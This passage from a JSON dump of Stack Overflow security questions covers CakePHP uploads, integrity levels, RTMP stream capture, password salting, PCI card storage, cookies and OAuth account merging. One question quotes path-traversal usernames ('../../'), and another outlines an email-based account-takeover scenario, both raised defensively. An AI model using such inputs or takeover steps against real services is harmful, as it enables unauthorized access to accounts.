see.</p>\n"},{"tags":["security","cakephp","cakephp-2.0","uploadify","swfupload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12689470,"title":"Cakephp 2.2 and SWFUploader black-holed","body":"<p>I am having a typical file upload method (inside a plugin) in my app and I am using for this Uploadify that uses SFWUpload.\nI used this for an application that is written in CakePHP 1.3 (and it worked OK). Now I am updating the app to CakePHP 2.2.2. The problem is that when I am trying to upload the file I am getting a Security black-holed error (400 error).</p>\n\n<ul>\n<li>I have disabled the Security for the uploader action inside the beforeFilter() callback but no success.</li>\n</ul>\n\n<blockquote>\n<pre><code>if($this-&gt;request-&gt;action == 'add_profile_picture'){\n\n   $this-&gt;Security-&gt;enabled = false;\n\n}\n</code></pre>\n</blockquote>\n\n<ul>\n<li>I have also disabled the Auth for that function so I don't have any problems on upload regarding the passing of Session and Flash...</li>\n</ul>\n\n<blockquote>\n<pre><code>...\n    $this-&gt;Auth-&gt;allow('add_profile_picture');\n...\n</code></pre>\n</blockquote>\n\n<p>If anyone had similar problems and solve it please give me a hint or two.</p>\n\n<p>Thanks</p>\n"},{"tags":["c++","security","winapi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12774738,"title":"How to determine the integrity level of a process","body":"<p>all\nI recently need to get the integrity level of a process, and I found help from MSDN. The sample code looks like this:</p>\n\n<pre><code>if (GetTokenInformation(hToken, TokenIntegrityLevel, \n     pTIL, dwLengthNeeded, &amp;dwLengthNeeded))\n {\n  dwIntegrityLevel = *GetSidSubAuthority(pTIL-&gt;Label.Sid, \n    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid)-1));\n\n  if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)\n  {\n   // Low Integrity\n   wprintf(L\"Low Process\");\n  }\n  else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp; \n       dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID)\n  {\n   // Medium Integrity\n   wprintf(L\"Medium Process\");\n  }\n  else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID)\n  {\n   // High Integrity\n   wprintf(L\"High Integrity Process\");\n  }\n  else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_SYSTEM_RID)\n  {\n   // System Integrity\n   wprintf(L\"System Integrity Process\");\n  }\n }\n</code></pre>\n\n<p>As you all know, </p>\n\n<pre><code>SECURITY_MANDATORY_LOW_RID == 0x00001000L\nSECURITY_MANDATORY_MEDIUM_RID == 0x00002000L\nSECURITY_MANDATORY_HIGH_RID == 0x00003000L\nSECURITY_MANDATORY_SYSTEM_RID == 0x00004000L.\n</code></pre>\n\n<p><strong>Here is my question:</strong>\nIf this sample code is correct, then what integrity level does process A have if it has the dwIntegrityLevel of 0x00004100L? SECURITY_MANDATORY_HIGH_RID and SECURITY_MANDATORY_SYSTEM_RID? Does it mean that a process have SECURITY_MANDATORY_SYSTEM_RID level also have a SECURITY_MANDATORY_HIGH_RID?</p>\n\n<p>If the sample code is wrong, then what is the right way to determine the integrity level of a process?</p>\n"},{"tags":["osx","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12778170,"title":"Is it possible to change User's Home Directorys permission in OSX?","body":"<p>Most of your staff uses OSX as main operation system. The problem is that recently we were attacked with some odd malware: users are getting zip-file via mail, and when they open this zip file, they execute a binary keylogger malware, that is inside this zipped file.</p>\n\n<p>We have some non-technical limitations and due this limitation we can't configure user's mail servers. But actually we have physical access to their laptops.</p>\n\n<p>As far as I know, there is possible to mount user's home directory without \"x\" (execution) permission in Linux and *BSD. So users can't run some binary file inside home directory.</p>\n\n<p>Is it possible to configure OS X so that user can't execute files inside /Users/?</p>\n"},{"tags":["sql","sql-server","security","design-patterns"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12776105,"title":"SQL Query Execution more than once?","body":"<p>I have 2 tables (A,B), and 1 query</p>\n\n<p>My query is something like this</p>\n\n<ol>\n<li>Read From A</li>\n<li>Update B with this data from A</li>\n<li>Using the updated table B, set final value of A.</li>\n</ol>\n\n<p>Example execution can be find in below question:\n<a href=\"http://stackoverflow.com/questions/12775845/proper-way-to-keep-a-single-data-in-sql-server\">Proper way to keep a single data in sql server?</a></p>\n\n<p>Now since all the process is connected, this query should not be executed twice at the same time, or by 2 different users until the process ends. How do I prevent this ? Or does it already work securely like this?</p>\n"},{"tags":["python","security","mobile"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":171,"score":0,"question_id":4081333,"title":"feature mobile phone tracking application","body":"<p>I would like to build a mobile phone tracking application for feature phones which have minimum of gprs connectivity. I would like a user to log in to the application and be able to see the location of their phone through google maps. Any resources or information will be highly appreciated. I would preferably use python.</p>\n"},{"tags":["security","symfony2","login","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12772773,"title":"CSRF protection in login form","body":"<p>I'm using Symfony 2.1 to build a website with a little login form. I'm following the tutorial at <a href=\"http://symfony.com/doc/current/book/security.html#book-security-form-login\" rel=\"nofollow\">this</a> link but I don't see any part talking about the CSRF protection. However, <a href=\"http://symfony.com/doc/current/reference/configuration/security.html\" rel=\"nofollow\">here</a> there are all the options for the login security and at the end I can clearly see that that type of protection should be supported. I don't understand how to use it</p>\n"},{"tags":["flash","security","rtmp","shockwave"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3073,"score":1,"question_id":4808322,"title":"How to save this rtmp flash video stream?","body":"<p>Please don't flag this post as not programming related. Only programmers can answer this. </p>\n\n<p>My sister wanted me to save <a href=\"http://esewingworkshop.com/video-lesson/overview-zipper-types\" rel=\"nofollow\">http://esewingworkshop.com/video-lesson/overview-zipper-types</a> flash video &amp; couple more for offline viewing purposes and asked me how to save it.</p>\n\n<p>I immediately fired firebug in firefox but surprisingly the video source is not in the requests. <a href=\"http://hwcdn.net/m7n9i8d5/fms/videos/5_Standard_Zipper/B_Overview_of_Zipper_Types.flv.smil\" rel=\"nofollow\">http://hwcdn.net/m7n9i8d5/fms/videos/5_Standard_Zipper/B_Overview_of_Zipper_Types.flv.smil</a> is the last request that is being made. response being:</p>\n\n<pre><code>&lt;smil&gt;\n&lt;head&gt;\n&lt;meta base=\"rtmp://fms006.lo1.hwcdn.net/m7n9i8d5/_definst_\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;video src=\"fms/videos/5_Standard_Zipper/B_Overview_of_Zipper_Types?doppl=965d6485db1d06d2&amp;dopsig=867922856d781b57521a1dd3f7c28c5b\"&gt;&lt;/video&gt;\n&lt;/body&gt;\n&lt;/smil&gt;\n</code></pre>\n\n<p>So, I its using <code>rtmp</code> streaming protocol. I tried to figure out the source of this stream. I used \"wireshark\" and analysed the traffic and followed the TCP stream:</p>\n\n<pre><code>POST http://fms006.lo1.hwcdn.net/fcs/ident2 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: fms035.lo1.hwcdn.net\nContent-Length: 1\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n HTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 14\nServer: FlashCom/3.5.5\nContent-Type: text/plain\n\n209.197.11.150POST http://209.197.11.219/open/1 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: 209.197.11.219\nContent-Length: 1\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n HTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 17\nServer: FlashCom/3.5.5\nContent-Type: application/x-fcs\n\nWubmcmj7Q1T-6Tic\nPOST http://209.197.11.219/idle/Wubmcmj7Q1T-6Tic/0 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: 209.197.11.219\nContent-Length: 1\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n HTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 1\nServer: FlashCom/3.5.5\nContent-Type: application/x-fcs\n\nPOST http://209.197.11.219/send/Wubmcmj7Q1T-6Tic/1 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: 209.197.11.219\nContent-Length: 1537\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\nHTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 3074\nServer: FlashCom/3.5.5\nContent-Type: application/x-fcs\n</code></pre>\n\n<p>and these are HTTP POST requests made by shockwave flash player (plugin-containter.exe) in order:</p>\n\n<pre><code>http://fms006.lo1.hwcdn.net/fcs/ident2\nhttp://209.197.11.150/open/1\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/0\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/1\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/2\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/3\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/4\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/5\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/6\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/7\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/8\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/9\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/10\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/11\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/12\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/13\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/14\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/15\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/16\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/17\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/18\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/19\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/20\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/21\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/22\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/23\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/24\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/25\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/26\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/27\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/28\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/29\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/30\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/31\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/32\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/33\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/34\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/35\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/36\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/37\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/38\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/39\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/40\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/41\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/42\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/43\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/44\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/45\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/46\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/47\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/48\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/49\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/50\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/51\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/52\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/53\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/54\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/55\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/56\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/57\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/58\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/59\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/60\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/61\n_this continues till /407..._\n</code></pre>\n\n<p>I don't get it. I'm little confused about how exactly this communication is taking place? I'm unable to find the video source. As far as I understood, from the SMIL request (browser made it) its getting the server address and then shockwaveplayer is taking over the communication and responses to these HTTP POST requests are the video in chunks. </p>\n\n<p>But how &amp; where is it identifying which video it wants? Where is RTMP? what is the url? How can I download it?</p>\n"},{"tags":["c#","security","authentication","cryptography","guid"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":213,"score":1,"question_id":12240885,"title":"Generating a unique *and* random URL in C#","body":"<p>My ultimate goal is to create a URL that is unique and cannot be guessed/predicted. The purpose of this URL is to allow users to perform operations like verifying their email address and resetting their password. These URLs would expire within a set amount of time (currently set to 24 hours).</p>\n\n<p>I was originally using a <code>Guid</code> for this purpose, but I now understand this to be somewhere between \"just fine\" and \"very insecure\", depending on which expert you listen to. So, I thought I'd beef up my code a little bit, just in case. At first I thought I'd just stick with using a <code>Guid</code>, but generate it from random bytes rather than the <code>Guid.NewGuid()</code> factory method. Here is the method I came up with:</p>\n\n<pre><code>public static Guid GetRandomGuid()\n{\n    var bytes = new byte[16];\n    var generator = new RNGCryptoServiceProvider();\n    generator.GetBytes(bytes);\n    return new Guid(bytes);\n}\n</code></pre>\n\n<p>I'm not quite clear on what exactly happens when you use <code>new Guid(bytes)</code> instead of <code>Guid.NewGuid()</code>, but I think all this method does is generate a random byte array and <em>store</em> it in a <code>Guid</code> data structure. In other words, it's no longer guaranteed to be unique, it's only guaranteed to be random.</p>\n\n<p>Since my URLs need to be both unique <em>and</em> random, this does not seem like a solid solution. I'm now thinking, I should base my URLs on a combination of both a unique ID (which could be a <code>Guid</code> or, if available, a database auto-incremented id) and a random sequence generated from <code>RNGCryptoServiceProvider</code>.</p>\n\n<p><strong>Questions</strong></p>\n\n<p>What's the best way to generate a verification/password-reset URL that is both guaranteed unique and extremely difficult/impossible to predict/guess?</p>\n\n<ul>\n<li><p>Should I simply construct my URL by concatenating a unique string with a random string?</p></li>\n<li><p>Does the .NET Framework have a built-in way to easily generate a unique <em>and</em> random (unpredictable) sequence that can be used for URLs?</p></li>\n<li><p>If not, is there a good solution available open source?</p></li>\n</ul>\n"},{"tags":[".net","security","mvc","wif"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12655250,"title":"How can i expose pattern for a user to link two accounts together in Azure ACS and WIF (SWT tokens)","body":"<p>Right now when the user is authenticated (over Azure ACS with WIF enabled for SWT tokens) it dont look like I can let them sign in again with a new provider and get two tokens.</p>\n\n<p>im looking for a pattern that would let users link two accounts together?</p>\n"},{"tags":["php","mysql","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12769478,"title":"How can I secure my database credentials when using shared hosting and no access to outside the webroot?","body":"<p>I have all of my database credentials within an include file that I wanted to place outside of my webroot file.</p>\n\n<p>However, my shared hosting plan does not allow me to place files outside of the webroot.  Would I have to look at encrypting my file in some way to make sure my credentials are secure?</p>\n\n<p>I had read a method to produce a kind of fake 404 page, but that doesnt sound very secure to me at all.</p>\n\n<p>I've also taken the step of creating a read-only user account so that if my account is compromised then at least nothing can be overwritten or dropped, but I obviously want to be as secure as I can given the limitations.</p>\n"},{"tags":["security","rest","ssl","proxy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12769837,"title":"Implement SSL by Proxy","body":"<p>We are writing an application which provides a RESTful API. The application needs to be secured, but I don't want my <em>Authentication/Encryption</em> mechanism to pollute the interfaced program nor the API.</p>\n\n<p>I was wondering if a Proxy could be helping in our case, but since I'm not an expert in web development, I need to know if my picture makes sense. The structure of the system should be the following:</p>\n\n<ol>\n<li><p>The server program simply exports the API on a TCP port, which however can be accessed only from a local process (bound to <code>127.0.0.1</code>);</p></li>\n<li><p>A proxy server manages SSL and Authentication:</p>\n\n<ul>\n<li>The URI and methods are exported as they are, but</li>\n<li>Only <strong>authenticated</strong> users, having the <strong>required capabilities</strong>, can actually call them, and</li>\n<li>The communication must be running on an encrypted channel</li>\n</ul></li>\n</ol>\n\n<p>So, my questions are:</p>\n\n<ol>\n<li><p>Is this a reasonable scenario?</p></li>\n<li><p>What is a good proxy server which I could be running for this job?</p></li>\n<li><p>Is there any drawback in doing this?</p></li>\n</ol>\n\n<p>Thanks for your help!</p>\n"},{"tags":["security","hash","passwords","salt"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12753062,"title":"Multiple Salts to protect passwords","body":"<p>If you use a salt before hashing a password - it will make the hash more secure. It makes sense, because rainbow table attacks become much more difficult (impossible?).</p>\n\n<p>What if you use multiple salts? For example - you check if the day is Monday, or the Month, the hour, etc (or some combination). Then you have a database which stores the fields: (userid, hash1, hash2, hash3...). </p>\n\n<p>Would this make the information any more (or less) secure?</p>\n\n<p>Example:</p>\n\n<p>1) User registers with password 'PASS'.\n2) System (php in this example) stores values (md5($password.$this_day)) for each day (7 passwords). into table password, column hash_monday, hash_tuesday etc.\n3) user logs in, and script checks password where 'hash_'.$this_day matches what is entered. </p>\n"},{"tags":["php","security","custom-errors","php-errors"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12768910,"title":"Programming errors in included files PHP","body":"<p>I have a common directory <code>core</code> for most important files of my PHP application. They work nice, when I call them from PHP script, but if I open it from my browses, I usually see programming errors such as </p>\n\n<pre><code>Notice: Undefined variable: current_user in S:\\rm\\core\\user-bar.php on line 1\n\nNotice: Trying to get property of non-object in S:\\rm\\core\\right-part.php on line 3 \n</code></pre>\n\n<p>Must I try to hide it, or fix it, because it can give to an attacker too much information about architecture of my application, or not?</p>\n"},{"tags":["c#","security","hash","passwords","windows-phone-7"],"answer_count":3,"favorite_count":3,"up_vote_count":2,"down_vote_count":0,"view_count":600,"score":2,"question_id":3747029,"title":"How to store passwords offline","body":"<p>Hey. \n Although this is focused on Windows Phone 7, I guess the principle is universal. I would like to have a password protected zone within my app. However, my application is completely offline and so I will have to store credential details on the phone. My initial idea is to store a hash of the password and the salt. Would this be the best way to go? If so, should the hash and salt be stored in plain text, or is there a way to ensure that even they are encrypted? I understand that having the entire scheme on the phone will eventually be cracked, but what would be the best way to raise the barrier? thanks for any suggestions</p>\n"},{"tags":["security","http","cookies","browser","web-security"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":12758187,"title":"Is domain attribute of a cookie sent back to a server?","body":"<p>If evil.example.com sets a cookie with a domain attribute set to .example.com, a browser will include this cookie in requests to foo.example.com.</p>\n\n<p><a href=\"http://lcamtuf.coredump.cx/tangled/\" rel=\"nofollow\">The Tangled Web</a> notes that for foo.example.com such cookie is largely indistinguishable from cookies set by foo.example.com. But according to <a href=\"https://www.ietf.org/rfc/rfc2109.txt\" rel=\"nofollow\">the RFC</a>, the domain attribute of a cookie should be sent to the server, which would make it possible for foo.example.com to distinguish and reject a cookie that was set by evil.example.com.</p>\n\n<p>What is the state of current browsers implementations? Is domain sent back with cookies?</p>\n"},{"tags":["security","imagemagick"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12761089,"title":"How to use ImageMagick to test if received input is an image (for security purposes)?","body":"<p>Imagine an environment in which users can upload images to a website by either uploading it from their pc or referring to a remote url. </p>\n\n<p>As part of some security checks I'd like to make sure that the referenced object is indeed an image. </p>\n\n<p>In the case of a remote-url, I of course check the content-type, but this isn't bullet-proof. </p>\n\n<p>I figured I could use ImageMagick to do the task. Perhaps executing the ImageMagick.identify() method and if no error is returned and returned type is either JPG|GIF|,etc. the content is an image. (In a quick check I noticed that TXT files are identified correctly as well, so I have to blacklist these) </p>\n\n<p>Is there any better way in doing this? </p>\n"},{"tags":["security","google-app-engine","authentication"],"answer_count":1,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":1212,"score":3,"question_id":6711382,"title":"Google AppEngine: custom authentication","body":"<p>The way I can authenticate my users in AppEngine using Google Accounts is simply wonderful.</p>\n\n<p>However, I need to use my <strong>custom authentication-login system</strong>.</p>\n\n<p>I will have a AppUsers table, with usernames and encrypted passwords.</p>\n\n<p>I read something about sessions on gae, but I need help on starting up my app security.</p>\n\n<p>How can I track my authenticated user session? Setting a cookie?</p>\n\n<p>A beginner.</p>\n"},{"tags":["security","e-commerce","pci-dss"],"answer_count":9,"favorite_count":264,"up_vote_count":182,"down_vote_count":0,"view_count":10943,"score":182,"question_id":51094,"title":"Payment Processors - What do I need to know if I want to accept credit cards on my website?","body":"<p><a href=\"http://www.rsa.com/node.aspx?id=1156\">This question</a> talks about different payment processors and what they cost, but I'm looking for the answer to what do I need to do if I want to accept credit card payments?</p>\n\n<p>Assume I need to <em>store</em> credit card numbers for customers, so that the obvious solution of relying on the credit card processor to do the heavy lifting is not available.</p>\n\n<p><a href=\"http://www.aladdin.com/etoken/\">PCI Data Security</a>, which is apparently the standard for storing credit card info, has a bunch of general requirements, but <a href=\"http://en.wikipedia.org/wiki/PCI_DSS\">how does one implement them</a>? </p>\n\n<p>And what about the vendors, like <a href=\"http://usa.visa.com/merchants/risk_management/cisp_payment_applications.html\">Visa</a>, who have their own best practices?</p>\n\n<p>Do I need to have keyfob access to the machine? What about physically protecting it from hackers in the building?  Or even what if someone got their hands on the backup files with the sql server data files on it?</p>\n\n<p>What about backups? Are there other physical copies of that data around?</p>\n\n<p>Tip: <a href=\"http://transfs.com/blog/\">If you get a merchant account, you should negotiate that they charge you \"interchange-plus\" instead of tiered pricing.</a>  With tiered pricing, they will charge you different rates based on what type of Visa/MC is used -- ie. they charge you more for cards with big rewards attached to them.  Interchange plus billing means you only pay the processor what Visa/MC charges them, plus a flat fee.  (Amex and Discover charge their own rates directly to merchants, so this doesn't apply to those cards.  You'll find Amex rates to be in the 3% range and Discover could be as low as 1%.  Visa/MC is in the 2% range).  <a href=\"http://transfs.com/\">This service is supposed to do the negotiation for you</a> (I haven't used it, this is not an ad, and I'm not affiliated with the website, but this service is greatly needed.)</p>\n\n<p><em>This blog post gives a <a href=\"http://blog.boxedice.com/2009/05/20/taking-payments-online-merchant-account-payment-processor-fees/\">complete rundown of handling credit cards</a> (specifically for the UK).</em></p>\n\n<hr>\n\n<p>Perhaps I phrased the question wrong, but I'm looking for tips like these:</p>\n\n<ol>\n<li>Use <a href=\"http://www.rsa.com/node.aspx?id=1156\">SecurID</a> or <a href=\"http://www.aladdin.com/etoken/\">eToken</a> to add an additional password layer to the physical box.</li>\n<li>Make sure the box is in a room with a physical lock or keycode combination.</li>\n</ol>\n"},{"tags":["php","ajax","security","login","verification"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":12755844,"title":"Tell another PHP page that the user is verified","body":"<p>I have <code>page_a.php</code>, where the user must login.</p>\n\n<p>This page, when the user successfully logs in, makes an AJAX load of <code>page_b.php</code>. However, I don't want anyone to be able to directly visit <code>page_b.php</code> without having logged in to <code>page_a.php</code> first.</p>\n\n<p>I was thinking I could use this as the URL for the AJAX load:</p>\n\n<pre><code>page_b.php?hash=xxxxx\n</code></pre>\n\n<p>then on <code>page_b.php</code> have something that checks if the hash generated by <code>page_a.php</code> was indeed generated by <code>page_a.php</code>, not copied and pasted from a previous session by somebody who looked at their web inspector.</p>\n\n<p>However I don't know how to generate a hash that <code>page_b.php</code> knows was generated by <code>page_a.php</code>. Or is there a better way to go about it?</p>\n"},{"tags":["python","string","security","unicode"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":68,"score":-1,"question_id":12756007,"title":"Fastest way to remove unsafe chars from string but keep unicode characters?","body":"<p>I recently ran a test on HackerNews inviting people to come break my web app (<a href=\"http://www.tagxt.com\" rel=\"nofollow\">www.tagxt.com</a>).</p>\n\n<p>Some people succeeded in breaking a couple things I'm trying to fix.</p>\n\n<p>The one I'm after here is:</p>\n\n<p>How do I stop people from creating usernames like <code>../../</code> and <code>../logout</code> but still let them use unicode characters like <code></code> ? Also, the <code>_</code> underscore is ok.</p>\n\n<p>Max username length is 15 chars so performance is not a big factor but I would like to find the fastest way to remove dangerous characters.</p>\n"},{"tags":["javascript","security","backbone.js"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":221,"score":1,"question_id":11031481,"title":"Backbone.js Security","body":"<p>i am learning Backbone.js at the moment, so sorry if my question is nooby :-P</p>\n\n<p>in my program i check my data at server-side to be correct and etc ... but i was wondering what will happen if users change the data stored in models using Console in FireBug for example and try .save() or .fetch().</p>\n\n<p>is there any way to stop such actions ?</p>\n\n<p>considering all my data is going to be stored in models and can be easily retrieved by users i am not really comfortable using backbone.js, is it just me or is there something wrong here ?!</p>\n"},{"tags":["spring","security","cookies","spring-security","remember-me"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12761431,"title":"URLConnection and Spring Security PersistentTokenBasedRememberMeServices","body":"<p>I'm trying to use sitemesh to pull content together on a screen. You have to be \"logged\" into the site to view the page that site mesh is displaying and you must be logged in to view the components sitemesh is trying to pull in and decorate. </p>\n\n<p>I'm using spring security and PersistentTokenBasedRememberMeServices to do this. What happens is, when site mesh calls out to get it's components to decorate it gets the login screen provided by spring security instead of the content even though the user is logged in and has access to the page.</p>\n\n<p>Digging through the sitemesh code, site mesh is making a URL and a URLconnection to make it's calls to decorate. </p>\n\n<pre><code>URL url = new URL(this.page);\n\nURLConnection urlConn = url.openConnection();\n\nurlConn.setUseCaches(true);\n\nBufferedReader in = new BufferedReader(new InputStreamReader(urlConn.getInputStream()));\n</code></pre>\n\n<p>So I guess my question is... can I just attach the spring security token to the urlConnection like this? </p>\n\n<pre><code>URL url = new URL(page);\nURLConnection urlConn = url.openConnection();\nurlConn.setRequestProperty(\"Cookie\", myCookie);\nurlConn.setUseCaches(true);\nurlConn.connect(); \n</code></pre>\n\n<p>If so, what does the format of the cookie need to be? I've tried what is below (the gibberish is the value of the security cookie generated by spring security)</p>\n\n<pre><code>securityCookie=Y2E0cFR1WWp6RTRjTzRBSFhYaG50dz09OjR mNzlON2syVXh3M01BSXRONGV2QXc9PQ\n</code></pre>\n\n<p>It doesn't work as I get a cookie theft exception from Spring Security. Any ideas? Do I need to add the path or domain? If so what is the format?</p>\n\n<p>Does the cookie value need to be encoded in some way?</p>\n"},{"tags":["security","authentication","oauth"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12715518,"title":"How to handle account creation and login through multiple means","body":"<h1>Authentication flow design</h1>\n\n<p>When creating a service that allows users to register and login through more than one way (facebook, twitter, local account), what is the best way to handle the account creation and validation through multiple means?</p>\n\n<h2>In Other Words</h2>\n\n<p>Imagine this situation:</p>\n\n<ul>\n<li>A user creates a normal account by sending his (or possibly anyone's) <strong>email</strong> and <strong>password</strong> (that gets hashed, etc)</li>\n<li>For <strong>convenience</strong>, the user immediately has access to their newly created account (<em>without verifying their email address</em>)</li>\n<li>A user then tries to login with an external oAuth service: Twitter, Facebook, etc</li>\n<li>When logging in with facebook, its found that an account was already created (manually) with the same email address</li>\n</ul>\n\n<h2>What is the best way to handle this?</h2>\n\n<p>I'm trying to come up with a solution that is both user-friendly (convenient) and secure, and the possible security flaws are scaring me.</p>\n\n<h2>Example</h2>\n\n<p>Using the webservice <strong>\"Mixlr\"</strong> as an example, let's see how they handle this:</p>\n\n<ul>\n<li><strong>I</strong> create an account with <strong>YOUR</strong> email address (sucks for you)</li>\n<li>Mixlr instantly logs me in and lets me start using their service (that's convenient)</li>\n<li>They also send me an email to verify my account (even though I'm already using it)</li>\n<li><strong>YOU</strong> decide that you want to join Mixlr, so you create an account.... but instead of using the classic registration process, you opt to use <strong>Facebook</strong> to create your Mixlr account</li>\n<li>Interestingly, <strong>Facebook</strong> sends you back the same email address that <strong>I</strong> used to create <strong>MY</strong> account</li>\n<li>Mixlr decides to \"merge\" the accounts, simply adding your <strong>Facebook</strong> account as a new \"connected account\" in their service</li>\n</ul>\n\n<h2>Therein lies the problem</h2>\n\n<p>If <strong>I'm</strong> still logged in, using the service, I technically have some small control over <strong>YOUR</strong>  <strong>Facebook</strong> account....</p>\n\n<p>Isn't that insecure... and frankly, a little sketchy?</p>\n\n<p>Mixlr, however, doesn't let the user log in a \"second\" time without the user verifying/confirming their email address.</p>\n\n<p>Essentially, I don't know what the middle ground is for convenience 